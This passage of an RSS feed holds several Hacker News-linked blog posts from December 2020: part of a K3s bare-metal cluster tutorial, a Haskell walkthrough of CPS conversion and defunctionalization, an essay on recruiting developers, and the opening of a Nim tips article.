</li>
</ul>
<p>It may take some time for an engineer to approve the request.</p>
<p>Once you have the IP, set it in an environment variable:</p>
<pre><code>export EIP="147.75.100.237"
</code></pre>
<p>Add this line to <code>hosts.txt</code> so that you have it, if you need it later.</p>
<h3 id="enablebgpforeachserver">Enable BGP for each server</h3>
<p>Click on each server in the Equinix Metal dashboard. Click on its details page, then BGP. Find the Manage button on the IPv4 row and click "Enable BGP".</p>
<p>This setting allows BGP to be advertised from this server.</p>
<h3 id="provisionthefirstmaster">Provision the first master</h3>
<p>For various reasons, we can only set up kube-vip after K3s has started, so we will create the first master node:</p>
<pre><code>k3sup install \
  --ip $SERVER1 \
  --tls-san $EIP \
  --cluster \
  --k3s-channel latest \
  --k3s-extra-args "--no-deploy servicelb --disable-cloud-controller" \
  --merge \
  --local-path $HOME/.kube/config \
  --context=em-ha-k3s
</code></pre>
<ul>
<li><code>--tls-san</code> is required to advertise the EIP, so that K3s will create a valid certificate for the API server.</li>
<li>the <code>--k3s-channel</code> is specifying the latest version of K3s, which in this instance will be 1.19, by the time you run this tutorial, it may have changed, in which can you can give <code>1.19</code> as the channel, or a specific version with <code>--k3s-version</code></li>
<li>note the <code>--cluster</code> flag, which tells the server to use etcd to create a cluster for the servers we will join later on</li>
<li><code>--local-path</code>, <code>--context</code> and <code>--merge</code> all allow us to merge the KUBECONFIG from the K3s to our local file.</li>
<li>in <code>--k3s-extra-args</code> we disable the built-in K3s service load-balancer, and also disable the cloud-controller, because we will use the Equinix Metal Cloud Controller Manager instead.</li>
</ul>
<p>Now check your kubeconfig file is pointing at the right cluster:</p>
<pre><code>kubectx em-ha-k3s
</code></pre>
<p>Try querying the nodes in the cluster:</p>
<pre><code>[alex@nuc ~]$ kubectl get nodes
NAME           STATUS     ROLES         AGE   VERSION
k3s-server-1   Ready      etcd,master   7s    v1.19.5+k3s2
</code></pre>
<p>Apply the RBAC so that kube-vip can access the Kubernetes API and configure services:</p>
<pre><code>kubectl apply -f https://kube-vip.io/manifests/rbac.yaml
</code></pre>
<p>Now log into the first server using SSH. There is a one-time configuration option required for each server.</p>
<pre><code>ssh root@$SERVER1

ctr image pull docker.io/plndr/kube-vip:0.3.0

alias kube-vip="ctr run --rm --net-host docker.io/plndr/kube-vip:0.3.0"
export INTERFACE=lo
export EIP="147.75.100.237"

kube-vip vip /kube-vip manifest daemonset \
  --interface $INTERFACE \
  --vip $EIP \
  --controlplane \
  --services \
  --inCluster \
  --taint \
  --bgp \
  --packet \
  --provider-config /etc/cloud-sa/cloud-sa.json | tee /var/lib/rancher/k3s/server/manifests/vip.yaml
</code></pre>
<p>The manifest for kube-vip will be created at <code>/var/lib/rancher/k3s/server/manifests/vip.yaml</code>, any files placed here will be run by K3s.</p>
<p>Log out of the server</p>
<h3 id="deploytheequinixmetalcloudcontrollermanager">Deploy the Equinix Metal â€¦</h3></div></section></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.alexellis.io/bare-metal-kubernetes-with-k3s/">https://blog.alexellis.io/bare-metal-kubernetes-with-k3s/</a></em></p>]]>
            </description>
            <link>https://blog.alexellis.io/bare-metal-kubernetes-with-k3s/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25505735</guid>
            <pubDate>Tue, 22 Dec 2020 12:50:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Donâ€™t Think, Just Defunctionalize]]>
            </title>
            <description>
<![CDATA[
Score 52 | Comments 4 (<a href="https://news.ycombinator.com/item?id=25505701">thread link</a>) | @gbrown_
<br/>
December 22, 2020 | https://www.joachim-breitner.de/blog/778-Don%E2%80%99t_think%2C_just_defunctionalize | <a href="https://web.archive.org/web/*/https://www.joachim-breitner.de/blog/778-Don%E2%80%99t_think%2C_just_defunctionalize">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>TL;DR: CPS-conversion and defunctionalization can help you to come up with a constant-stack algorithm.</p>
<p><em>Update:</em> Turns out I inadvertedly plagiarized the talk <a href="https://t.co/YlN0MOnN83?amp=1">The Best Refactoring Youâ€™ve Never Heard Of</a> by James Koppel. Please consider this a form of sincere flattery.</p>
<h3 id="the-starting-point">The starting point</h3>
<p>Today, Iâ€™ll take you on a another little walk through the land of program transformations. Letâ€™s begin with a simple binary tree, with value of unknown type in the leaves, as well as the canonical <code>map</code> function:</p>
<div><pre><code><span>data</span> <span>T</span> a <span>=</span> <span>L</span> a <span>|</span> <span>B</span> (<span>T</span> a) (<span>T</span> a)

<span>map1 ::</span> (a <span>-&gt;</span> b) <span>-&gt;</span> <span>T</span> a <span>-&gt;</span> <span>T</span> b
map1 f (<span>L</span> x) <span>=</span> <span>L</span> (f x)
map1 f (<span>B</span> t1 t2) <span>=</span> <span>B</span> (map1 f t1) (map1 f t2)</code></pre></div>
<p>As you can see, this <code>map</code> function is using the program stack as it traverses the tree. Our goal is now to come up with a <code>map</code> function that does <em>not</em> use the stack!</p>
<p>Why? Good question! In Haskell, there wouldnâ€™t be a strong need for this, as the Haskell stack is allocated on the heap, just like your normal data, so there is plenty of stack space. But in other languages or environments, the stack space may have a hard limit, and it may be advised to not use unbounded stack space.</p>
<p>That aside, itâ€™s a fun exercise, and thatâ€™s sufficient reason for me.</p>
<p>(In the following, I assume that tail-calls, i.e. those where a function end with another function call, but without modifying its result, do not actually use stack space. Once <em>all</em> recursive function calls are tail calls, the code is equivalent to an imperative loop, as we will see.)</p>
<h3 id="think">Think?</h3>
<p>We <em>could</em> now just stare at the problem (rather the code), and try to come up with a solution directly. Weâ€™d probably think â€œok, as I go through the tree, I have to remember all the nodes <em>above</em> meâ€¦ so I need a list of those nodesâ€¦ and for each of these nodes, I also need to remember whether I am currently processing the left child, and yet have to look at the right one, or whether I am done with the left childâ€¦ so what do I have to remember about the current nodeâ€¦?â€</p>
<p>â€¦ ah, my brain spins already. Maybe eventually I figure it out, but why think when we can <em>derive</em> the solution? So letâ€™s start with above <code>map1</code>, and rewrite it, in several, mechanical, steps into a stack-less, tail-recursive solution.</p>
<h3 id="go">Go!</h3>
<p>Before we set out, let me rewrite the <code>map</code> function using a local <code>go</code> helper, as follows:</p>
<div><pre><code><span>map2 ::</span> forall a b<span>.</span> (a <span>-&gt;</span> b) <span>-&gt;</span> <span>T</span> a <span>-&gt;</span> <span>T</span> b
map2 f t <span>=</span> go t
  <span>where</span>
<span>    go ::</span> <span>T</span> a <span>-&gt;</span> <span>T</span> b
    go (<span>L</span> x) <span>=</span> <span>L</span> (f x)
    go (<span>B</span> t1 t2) <span>=</span> <span>B</span> (go t1) (go t2)</code></pre></div>
<p>This transformation (effectively the â€œstatic argument transformationâ€) has the nice advantage that we do not have to pass <code>f</code> around all the time, and that when we copy the function, I only have to change the top-level name, but not the names of the inner functions.</p>
<p>Also, I find it more aesthetically pleasing.</p>
<h3 id="cps">CPS</h3>
<p>A blunt, effective tool to turn code that is not yet using tail-calls into code that only uses tail-calls is use <em>continuation-passing style</em>. If we have a function of type <code>â€¦ -&gt; t</code>, we turn it into a function of type <code>â€¦ -&gt; (t -&gt; r) -&gt; r</code>, where <code>r</code> is the type of the result we want at the very end. This means the function now receives an extra argument, often named <code>k</code> for continuation, and instead of returning some <code>x</code>, the function calls <code>k x</code>.</p>
<p>We can apply this to our <code>go</code> function. Here, both <code>t</code> and <code>r</code> happen to be <code>T b</code>; the type of finished trees:</p>
<pre><code>map3 :: forall a b. (a -&gt; b) -&gt; T a -&gt; T b
map3 f t = go t (\r -&gt; r)
  where
    go :: T a -&gt; (T b -&gt; T b) -&gt; T b
    go (L x) k  = k (L (f x))
    go (B t1 t2) k  = go t1 (\r1 -&gt; go t2 (\r2 -&gt; k (B r1 r2)))</code></pre>
<p>Note that when initially call <code>go</code>, we pass the identity function <code>(\r -&gt; r)</code> as the initial continuation.</p>
<p>Alas, suddenly all function calls are in tail position, and this codes does not use stack space! Technically, we are done, although it is not quite satisfying; all these lambdas floating around obscure the meaning of the code, are maybe a bit slow to execute, and also, we didnâ€™t really learn much yet. This is certainly <em>not</em> the code we would have writing after â€œthinking hardâ€.</p>
<h3 id="defunctionalization">Defunctionalization</h3>
<p>So letâ€™s continue rewriting the code to something prettier, simpler. Something that does not use lambdas like this.</p>
<p>Again, there is a mechanical technique that can help it. It likely won't make the code prettier, but it will get rid of the lambdas, so letâ€™s do that an clean up later.</p>
<p>The technique is called <em>defunctionalization</em> (because it replaces functional values by plain data values), and can be seen as a form of <em>refinement</em>.</p>
<p>Note that we pass around vales of type <code>(T b -&gt; T b)</code>, but we certainly donâ€™t <em>mean</em> the full type <code>(T b -&gt; T b)</code>. Instead, only very specific values of that type occur in our program, So let us replace <code>(T b -&gt; T b)</code> with a data type that contains representatives of <em>just</em> the values we actually use.</p>
<ol>
<li><p>We find at all values of type <code>(T b -&gt; T b)</code>. These are:</p>
<ul>
<li><code>(\r -&gt; r)</code></li>
<li><code>(\r1 -&gt; go t2 (\r2 -&gt; k (B r1 r2)))</code></li>
<li><code>(\r2 -&gt; k (B r1 r2))</code></li>
</ul></li>
<li><p>We create a datatype with one constructor for each of these:</p>

<p>(This is not complete yet.)</p></li>
<li><p>We introduce an <em>interpretation</em> function that turns a <code>K</code> back into a <code>(T b -&gt; T b)</code>:</p>
<div><pre><code><span>eval ::</span> <span>K</span> <span>-&gt;</span> (<span>T</span> b <span>-&gt;</span> <span>T</span> b)
eval <span>=</span> (<span>*</span> <span>TBD</span> <span>*</span>)</code></pre></div></li>
<li><p>In the function <code>go</code>, instead of taking a parameter of type <code>(T b -&gt; T b)</code>, we take a <code>K</code>. And when we actually <em>use</em> the continuation, we have to turn the <code>K</code> back to the function using eval:</p>
<div><pre><code><span>go ::</span> <span>T</span> a <span>-&gt;</span> <span>K</span> a b <span>-&gt;</span> <span>T</span> b
go (<span>L</span> x) k  <span>=</span> eval k (<span>L</span> (f x))
go (<span>B</span> t1 t2) k <span>=</span> go t1 <span>K1</span></code></pre></div>
We also do this to the code fragments identified in the first step; these become:
<ul>
<li><code>(\r -&gt; r)</code></li>
<li><code>(\r1 -&gt; go t2 K2)</code></li>
<li><code>(\r2 -&gt; eval k (B r1 r2))</code></li>
</ul></li>
<li><p>Now we complete the <code>eval</code> function: For each constructor, we simply map it to the corresponding lambda from step 1:</p>
<div><pre><code><span>eval ::</span> <span>K</span> <span>-&gt;</span> (<span>T</span> b <span>-&gt;</span> <span>T</span> b)
eval <span>I</span> <span>=</span> (\r <span>-&gt;</span> r)
eval <span>K1</span> <span>=</span> (\r1 <span>-&gt;</span> go t2 <span>K2</span>)
eval <span>K2</span> <span>=</span> (\r2 <span>-&gt;</span> eval k (<span>B</span> r1 r2))</code></pre></div></li>
<li><p>This doesnâ€™t quite work yet: We have variables on the right hand side that are not bound (<code>t2</code>, <code>r1</code>, <code>k</code>). So letâ€™s add them to the constructors <code>K1</code> and <code>K2</code> as needed. This also changes the type <code>K</code> itself; it now needs to take type parameters.</p></li>
</ol>
<p>This leads us to the following code:</p>
<div><pre><code><span>data</span> <span>K</span> a b
  <span>=</span> <span>I</span>
  <span>|</span> <span>K1</span> (<span>T</span> a) (<span>K</span> a b)
  <span>|</span> <span>K2</span> (<span>T</span> b) (<span>K</span> a b)

<span>map4 ::</span> forall a b<span>.</span> (a <span>-&gt;</span> b) <span>-&gt;</span> <span>T</span> a <span>-&gt;</span> <span>T</span> b
map4 f t <span>=</span> go t <span>I</span>
  <span>where</span>
<span>    go ::</span> <span>T</span> a <span>-&gt;</span> <span>K</span> a b <span>-&gt;</span> <span>T</span> b
    go (<span>L</span> x) k  <span>=</span> eval k (<span>L</span> (f x))
    go (<span>B</span> t1 t2) k  <span>=</span> go t1 (<span>K1</span> t2 k)

<span>    eval ::</span> <span>K</span> a b <span>-&gt;</span> (<span>T</span> b <span>-&gt;</span> <span>T</span> b)
    eval <span>I</span> <span>=</span> (\r <span>-&gt;</span> r)
    eval (<span>K1</span> t2 k) <span>=</span> (\r1 <span>-&gt;</span> go t2 (<span>K2</span> r1 k))
    eval (<span>K2</span> r1 k) <span>=</span> (\r2 <span>-&gt;</span> eval k (<span>B</span> r1 r2))</code></pre></div>
<p>Not really cleaner or prettier, but everything is still tail-recursive, <em>and</em> we are now working with plain data.</p>
<h3 id="we-like-lists">We like lists</h3>
<p>To clean it up a little bit, we can notice that the <code>K</code> data type really is just a list of values, where the values are either <code>T a</code> or <code>T b</code>. We do not need a custom data type for this! Instead of our <code>K</code>, we can just use the following, built from standard data types:</p>
<pre><code>type K' a b = [Either (T a) (T b)]</code></pre>
<p>Now I replace <code>I</code> with <code>[]</code>, <code>K1 t2 k</code> with <code>Left t2 : k</code> and <code>K2 r1 k</code> with <code>Right r1 : k</code>. I also, very suggestively, rename <code>go</code> to <code>down</code> and <code>eval</code> to <code>up</code>:</p>
<div><pre><code><span>map5 ::</span> forall a b<span>.</span> (a <span>-&gt;</span> b) <span>-&gt;</span> <span>T</span> a <span>-&gt;</span> <span>T</span> b
map5 f t <span>=</span> down t []
  <span>where</span>
<span>    down ::</span> <span>T</span> a <span>-&gt;</span> <span>K'</span> a b <span>-&gt;</span> <span>T</span> b
    down (<span>L</span> x) k  <span>=</span> up k (<span>L</span> (f x))
    down (<span>B</span> t1 t2) k  <span>=</span> down t1 (<span>Left</span> t2 <span>:</span> k)

<span>    up ::</span> <span>K'</span> a b <span>-&gt;</span> <span>T</span> b <span>-&gt;</span> <span>T</span> b
    up [] r <span>=</span> r
    up (<span>Left</span>  t2 <span>:</span> k) r1 <span>=</span> down t2 (<span>Right</span> r1 <span>:</span> k)
    up (<span>Right</span> r1 <span>:</span> k) r2 <span>=</span> up k (<span>B</span> r1 r2)</code></pre></div>
<p>At this point, the code suddenly makes more sense again. In fact, I can try to verbalize it:</p>
<blockquote>
<p>As we traverse the tree, we have to remember for all parent nodes, whether there is still something <code>Left</code> to do when we come back to it (so we remember a <code>T a</code>), or if we are done with that (so we have a <code>T b</code>). This is the list <code>K' a b</code>.</p>
<p>We begin to go <code>down</code> the left of the tree (noting that the right siblings are still left to do), until we hit a leaf. We transform the leaf, and then go <code>up</code>.</p>
<p>If we go <code>up</code> and hit the root, we are done. Else, if we go <code>up</code> and there is something <code>Left</code> to do, we remember the subtree that we just processed (as that is already in the <code>Right</code> form), and go <code>down</code> the other subtree. But if we go <code>up</code> and there is nothing <code>Left</code> to do, we put the two subtrees together and continue going up.</p>
</blockquote>
<p>Quite neat!</p>
<h3 id="the-imperative-loop">The imperative loop</h3>
<p>At this point we could stop: the code is pretty, makes sense, and has the properties we want. But letâ€™s turn the dial a bit further and try to make it an imperative loop.</p>
<p>We know that if we have a single tail-recursive function, then thatâ€™s equivalent to a loop, with the functionâ€™s parameter turning into mutable variables. But we have two functions!</p>
<p>It turns out that if you have two functions <code>a -&gt; r</code> and <code>b -&gt; r</code> that have the same return type (which they necessarily have here, since we CPS-converted them further up), then those two functions are equivalent to a <em>single</em> function taking â€œ<code>a</code> or <code>b</code>â€, i.e. <code>Either a b -&gt; r</code>. This really nothing else than the high-school level algebra rule of <span><em>r</em><sup><em>a</em></sup>â€…â‹…â€…<em>r</em><sup><em>b</em></sup>â€„=â€„<em>r</em><sup><em>a</em>â€…+â€…<em>b</em></sup></span>.</p>
<p>So (after reordering the arguments of <code>down</code> to put <code>T b</code> first) we can rewrite the code as</p>
<div><pre><code><span>map6 ::</span> forall a b<span>.</span> (a <span>-&gt;</span> b) <span>-&gt;</span> <span>T</span> a <span>-&gt;</span> <span>T</span> b
map6 f t <span>=</span> go (<span>Left</span> t) []
  <span>where</span>
<span>    go ::</span> <span>Either</span> (<span>T</span> a) (<span>T</span> b) <span>-&gt;</span> <span>K'</span> a b <span>-&gt;</span> <span>T</span> b
    go (<span>Left</span> (<span>L</span> x))     k        <span>=</span> go (<span>Right</span> (<span>L</span> (f x))) k
    go (<span>Left</span> (<span>B</span> t1 t2)) k        <span>=</span> go (<span>Left</span> t1) (<span>Left</span> t2 <span>:</span> k)
    go (<span>Right</span> r)  []             <span>=</span> r
    go (<span>Right</span> r1) (<span>Left</span>  t2 <span>:</span> k) <span>=</span> go (<span>Left</span> t2) (<span>Right</span> r1 <span>:</span> k)
    go (<span>Right</span> r2) (<span>Right</span> r1 <span>:</span> k) <span>=</span> go (<span>Right</span> (<span>B</span> r1 r2)) k</code></pre></div>
<p>Do you see the loop yet? If not, maybe it helps to compare it with the following equivalent imperative looking pseudo-code:</p>
<pre><code>mapLoop :: forall a b. (a -&gt; b) -&gt; T a -&gt; T b
mapLoop f t {
  var node = Left t;
  var parents = [];
  while (true) {
    switch (node) {
      Left (L x) -&gt; node := Right (L (f x))
      Left (B t1 t2) -&gt; node := Left t1; parents.push(Left t2)
      Right r1 -&gt; {
        if (parents.len() == 0) {
          return r1;
        } else {
          switch (parents.pop()) {
            Left t2  -&gt; node := Left t2; parents.push(Right r1);
            Right r2 -&gt; node := Right (B r1 r2)
          }
        }
      }
    }
  }
}</code></pre>
<h3 id="conclusion">Conclusion</h3>
<p>I find it enlightening to see how apparently very different approaches to a problem (recursive, lazy â€¦</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.joachim-breitner.de/blog/778-Don%E2%80%99t_think%2C_just_defunctionalize">https://www.joachim-breitner.de/blog/778-Don%E2%80%99t_think%2C_just_defunctionalize</a></em></p>]]>
            </description>
            <link>https://www.joachim-breitner.de/blog/778-Don%E2%80%99t_think%2C_just_defunctionalize</link>
            <guid isPermaLink="false">hacker-news-small-sites-25505701</guid>
            <pubDate>Tue, 22 Dec 2020 12:44:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Quickly Looking for Developers?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25505587">thread link</a>) | @pyb
<br/>
December 22, 2020 | https://vsevolod.net/quickly-looking-for-developers/ | <a href="https://web.archive.org/web/*/https://vsevolod.net/quickly-looking-for-developers/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main">
            <article>

    <header>
        
        <p>
          4 min read
          
        </p>
    </header>

    <section>
        <p>Because there is a significant shortage of experienced developers on the market
and has been for quite some time, you rarely have a queue of great candidates
for a newly opened position.</p>
<p>Itâ€™s common for engineers to groan about irrelevant spammy requests from
clueless recruiters on LinkedIn with â€œWe think you can be a great fit for our
job opening. Youâ€™ll develop our front-end in KubeScript and you need 15 years of
experience in Kafkaâ€.</p>
<p>This isnâ€™t surprising, given the current market â€” how much time would an
experienced developer need to find a job? Not the best and most fulfilling job
of their life, but just some job with enough compensation to support their
family.</p>
<p>For a lot of folks all it would take are a change in their LinkedIn profile and
a tweet like â€œX years of experience in this and that, looking for work,
area/remote!â€</p>
<p>Hence lots of developers adopt a somewhat sarcastic stance regarding unsolicited
job propositions like â€œsuuure, tell me moreâ€. Itâ€™s probably not the most
constructive way to go, but Iâ€™m not judging it and I was behaving like that for
years<a href="https://vsevolod.net/quickly-looking-for-developers/#note1"><sup id="back1">[1]</sup></a>.</p>
<p>What is much more surprising to me is when people transition to the hiring side
of the market and keep the same attitude. They keep thinking of themselves as
"highly wanted" and when they want to hire someone quickly, they post to social
media something along the lines of â€œLooking for a super-duper developer for my
project, please retweet!â€</p>
<p>Yeah, suuure.</p>
<p>I had roughly the same dialogue with my friends many times over:</p>
<blockquote>
<p>â€œCan you recommend someone? Iâ€™m looking for a Python developer.â€<br>
â€œNope, everyoneâ€™s busy.â€<br>
â€œOK.â€</p>
</blockquote>
<p>Why did they need a human to hire? Do they need anybody so quickly that they do
not have time to write a description? How should I refer to someone?</p>
<blockquote>
<p>â€œFriends are looking for a developer, want to talk to them?â€<br>
â€œEhh, my current project isnâ€™t too shabby. What do they do?â€<br>
â€œNot really sure, I can introduce you and theyâ€™ll explain.â€<br>
â€œThanks, Iâ€™ll pass.â€</p>
</blockquote>
<p>Iâ€™ve had this conversation a couple of times and do not bother anymore.</p>
<p>Once Iâ€™ve asked my friend a dozen or so questions about their project, pried
some information out of him and got a description that was pretty interesting to
a couple of people that I contacted.</p>
<p>Even if they werenâ€™t hired immediately after that, they remembered it. Maybe
their friend is looking for work, maybe theyâ€™ll be open for opportunities in
half a year and youâ€™ll still be looking for people to hire.</p>
<p>But thatâ€™s not my job to pull information about your project out of you with a
pair of pliers, itâ€™s not a job for your friends, general public or
candidates. Itâ€™s your own job.</p>
<p>Even Elon Musk doesnâ€™t just write â€œI'm hiring developers for a cool projectâ€. He
describes and markets them, for example
<a href="https://twitter.com/elonmusk/status/667516705116065792">Tesla autopilot team</a> in
<a href="https://twitter.com/elonmusk/status/667519445414252544">2015</a>, and
<a href="https://twitter.com/elonmusk/status/1284306733720940544">Neuralink</a> in
<a href="https://twitter.com/elonmusk/status/1284642001888047104">2020</a>.</p>
<p>And everyone knows who Elon Musk is and what he does. Iâ€™m baffled whenever I see
retweets â€œLooking for a great frontend developer for my project!â€  written by
effectively anonymous people to me. Iâ€™m seeing the same tweets with minor
variations pretty regularly for more than a decade.</p>
<p>The best thing you can do to have good candidates is to write a good honest
description of a project together with the tasks that a person will accomplish
if hired. And it must be you who writes it â€” a hiring manager, not a poor
recruiter whom you've given a list of five-to-ten buzzwords.</p>
<h4 id="notes">Notes<a href="#notes" aria-label="Anchor link for: notes">ğŸ”—</a></h4>
<p><a href="https://vsevolod.net/quickly-looking-for-developers/#back1"><sup id="note1">[1]</sup></a> For context: I was a professional
developer since 2006 and for half of that time Iâ€™m much more often on the hiring
side.</p>

    </section>

    

</article>


        </div></div>]]>
            </description>
            <link>https://vsevolod.net/quickly-looking-for-developers/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25505587</guid>
            <pubDate>Tue, 22 Dec 2020 12:27:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Nim Apocrypha, Vol. I]]>
            </title>
            <description>
<![CDATA[
Score 55 | Comments 7 (<a href="https://news.ycombinator.com/item?id=25505492">thread link</a>) | @ibobev
<br/>
December 22, 2020 | https://blog.johnnovak.net/2020/12/21/nim-apocrypha-vol1/ | <a href="https://web.archive.org/web/*/https://blog.johnnovak.net/2020/12/21/nim-apocrypha-vol1/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wrapper">

    

    <div role="main">



<article>
  <header>
    
    <p><time datetime="2020-12-21">2020 Dec 21</time></p>
  </header>

  
    <nav>
      <ul>
      
        <li><a href="https://blog.johnnovak.net/tag/coding/">coding</a></li>
      
        <li><a href="https://blog.johnnovak.net/tag/nim/">nim</a></li>
      
      </ul>
    </nav>
  

  


<ul id="markdown-toc">
  <li><a href="#intro" id="markdown-toc-intro">Intro</a></li>
  <li><a href="#i--the-not-so-obvious" id="markdown-toc-i--the-not-so-obvious">I â€” The Not-So-Obvious</a>    <ul>
      <li><a href="#1--reducing-executable-size-by-stripping-debug-symbols" id="markdown-toc-1--reducing-executable-size-by-stripping-debug-symbols">1 &nbsp; Reducing executable size by stripping debug symbols</a></li>
      <li><a href="#2--release-builds-with-exception-logging" id="markdown-toc-2--release-builds-with-exception-logging">2 &nbsp; Release builds with exception logging</a></li>
      <li><a href="#3--switching-to-arcorc" id="markdown-toc-3--switching-to-arcorc">3 &nbsp; Switching to ARC/ORC</a></li>
      <li><a href="#4--executable-icons-on-windows-mingw" id="markdown-toc-4--executable-icons-on-windows-mingw">4 &nbsp; Executable icons on Windows (MinGW)</a></li>
      <li><a href="#5--debug-echo-in-windows-gui-programs-mingw" id="markdown-toc-5--debug-echo-in-windows-gui-programs-mingw">5 &nbsp; Debug echo in Windows GUI programs (MinGW)</a></li>
    </ul>
  </li>
  <li><a href="#ii--the-hidden" id="markdown-toc-ii--the-hidden">II â€” The Hidden</a>    <ul>
      <li><a href="#6--using-keyword" id="markdown-toc-6--using-keyword">6 &nbsp; â€˜usingâ€™ keyword</a></li>
      <li><a href="#7--opening-urls-in-the-default-browser" id="markdown-toc-7--opening-urls-in-the-default-browser">7 &nbsp; Opening URLs in the default browser</a></li>
      <li><a href="#8--cross-platform-home-and-config-directories" id="markdown-toc-8--cross-platform-home-and-config-directories">8 &nbsp; Cross-platform home and config directories</a></li>
      <li><a href="#9--debug-dumping-expressions" id="markdown-toc-9--debug-dumping-expressions">9 &nbsp; Debug dumping expressions</a></li>
      <li><a href="#10--measuring-elapsed-time" id="markdown-toc-10--measuring-elapsed-time">10 &nbsp; Measuring elapsed time</a></li>
      <li><a href="#11--dealing-with-openarrays" id="markdown-toc-11--dealing-with-openarrays">11 &nbsp; Dealing with openarrays</a></li>
    </ul>
  </li>
  <li><a href="#iii--the-crafty" id="markdown-toc-iii--the-crafty">III â€” The Crafty</a>    <ul>
      <li><a href="#12--easy-pointer-manipulations" id="markdown-toc-12--easy-pointer-manipulations">12 &nbsp; Easy pointer manipulations</a></li>
      <li><a href="#13--taming-circular-type-dependencies" id="markdown-toc-13--taming-circular-type-dependencies">13 &nbsp; Taming circular type dependencies</a></li>
      <li><a href="#14--with-macro" id="markdown-toc-14--with-macro">14 &nbsp; â€˜withâ€™ macro</a></li>
      <li><a href="#15--aliases" id="markdown-toc-15--aliases">15 &nbsp; Aliases</a></li>
    </ul>
  </li>
  <li><a href="#iv--the-grand-finale" id="markdown-toc-iv--the-grand-finale">IV â€” The Grand Finale</a>    <ul>
      <li><a href="#16--saving-memory-by-object-field-reordering" id="markdown-toc-16--saving-memory-by-object-field-reordering">16 &nbsp; Saving memory by object field reordering</a>        <ul>
          <li><a href="#the-enigma" id="markdown-toc-the-enigma">The Enigma</a></li>
          <li><a href="#the-explanation" id="markdown-toc-the-explanation">The Explanation</a></li>
        </ul>
      </li>
    </ul>
  </li>
  <li><a href="#outro" id="markdown-toc-outro">Outro</a></li>
</ul>

<h2 id="intro">Intro</h2>

<p>Greetings fellow Nim adventurers! Below you will find 16 handy Nim tips
&amp; tricks I came across while developing a medium-sized GUI program this year,
<a href="https://github.com/johnnovak/gridmonger">Gridmonger</a>
(<a href="https://github.com/johnnovak/koi">and</a>
<a href="https://github.com/johnnovak/nim-riff">related</a>
<a href="https://github.com/johnnovak/nim-binstreams">libraries</a>).  Some of them are
about less known or undocumented Nim features or standard library functions,
a few are workarounds for some rough edges of the language, and thereâ€™s also
a handful of useful techniques I read about in forums or have invented on my
own.</p>

<p>All tips are for Nim 1.4.2 and beyond, and most are applicable to the
C backend. I hope youâ€™ll find something useful here that will make your time
with Nim more enjoyable and productive!</p>

<h2 id="i--the-not-so-obvious">I â€” The Not-So-Obvious</h2>

<h3 id="1--reducing-executable-size-by-stripping-debug-symbols">1 &nbsp; Reducing executable size by stripping debug symbols</h3>

<p>Nim touts itself as a language capable of generating small native binaries.
But just naively compiling some program with <code>nim c -d:release</code> and looking at
the file sizes will make you wonder about the validity of that claim!</p>

<p>A release build of <a href="https://github.com/johnnovak/gridmonger">Gridmonger</a>
weighs around 12 megs. Anything but small, if you ask me!<sup id="fnref:small" role="doc-noteref"><a href="#fn:small">1</a></sup> Sure, it
statically links <a href="https://github.com/johnnovak/nim-glfw">GLFW</a> and
<a href="https://github.com/johnnovak/nim-nanovg">NanoVG</a> and a bunch of other Nim
libraries, but to put things into perspective, <a href="https://reaper.fm/">REAPER</a> (a
highly-advanced and complex DAW written in C/C++) is about the same size at
~13 megs! Surely, my program is much simpler than REAPER, so whatâ€™s going on
here?</p>

<p>It turns out that gcc debug symbols are included in Nim binaries by default,
which can account for a quite substantial 2-to 5-fold size increase! Luckily,
we can remove them easily with the <code>strip</code> command which comes with gcc.</p>

<p>How about trying to optimise for a small executable with <code>--opt:size</code>?  Sure,
that would yield about 30% smaller binaries, but at the expense of some
potential runtime performance loss. So while it might not always be the best
option, but you can always it <em>and</em> strip the debug symbols for even bigger
savings.</p>

<p>Finally, if youâ€™re hell-bent on producing smallest possible binary,
compressing it with an executable packer like <a href="https://upx.github.io/">UPX</a>
could be just the ticket.</p>

<p>The below table summarises my findings with some concrete data:</p>

<figure>
  <table>
    <tbody><tr>
      <th rowspan="2">Compiler flags</th>
      <th rowspan="2">File</th>
      <th colspan="2">Binary size</th>
    </tr>
    <tr>
      <th>Bytes</th>
      <th>Ratio</th>
    </tr>

    <tr>
      <td rowspan="3"><code>-d:release<br>--gc:arc --deepCopy:on</code></td>
      <td>original</td>
      <td>12,177,797</td>
      <td>1.00</td>
    </tr>
    <tr>
      <td>stripped</td>
      <td>2,269,696</td>
      <td>0.18</td>
    </tr>
    <tr>
      <td>compressed</td>
      <td>806,912</td>
      <td>0.07</td>
    </tr>

    <tr>
      <td rowspan="3"><code>-d:release --opt:size<br>--gc:arc --deepCopy:on</code></td>
      <td>original</td>
      <td>7,959,126</td>
      <td>1.00</td>
    </tr>
    <tr>
      <td>stripped</td>
      <td>1,655,296</td>
      <td>0.21</td>
    </tr>
    <tr>
      <td>compresed</td>
      <td>623,104</td>
      <td>0.08</td>
    </tr>
  </tbody></table>

  <figcaption>Table 1 â€” Comparison of compiled executable sizes for Gridmonger
  (with and without debug symbols, and without debug symbols and compressed
  with UPX) </figcaption>
</figure>

<p>I had repeated the experiment with the following minimal Nim program:</p>



<figure>
  <table>
    <tbody><tr>
      <th rowspan="2">Compiler flags</th>
      <th rowspan="2">File</th>
      <th colspan="2">Binary size</th>
    </tr>
    <tr>
      <th>Bytes</th>
      <th>Ratio</th>
    </tr>

    <tr>
      <td rowspan="3"><code>-d:release</code></td>
      <td>original</td>
      <td>125,068</td>
      <td>1.00</td>
    </tr>
    <tr>
      <td>stripped</td>
      <td>73,728</td>
      <td>0.59</td>
    </tr>
    <tr>
      <td>compresed</td>
      <td>31,232</td>
      <td>0.25</td>
    </tr>

    <tr>
      <td rowspan="3"><code>-d:release --opt:size</code></td>
      <td>original</td>
